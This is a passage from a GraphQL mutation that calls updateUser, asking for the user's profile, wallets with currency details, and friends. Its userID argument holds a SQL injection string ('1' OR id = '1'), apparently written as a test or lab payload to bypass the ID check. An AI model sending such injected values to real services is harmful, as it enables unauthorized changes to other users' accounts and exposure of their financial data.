  updateUser(userID: "1' OR id = '1'", firstName: "John", lastName: "Doe", description: "") {
    user {
      id
      firstName
      lastName
      description
      wallets {
        id
        name
        currency {
          id
          abbreviation
          symbol
          rate
          country
        }
      }
      friends {
        id
        firstName
        lastName
        description
      }
    }
  }
}

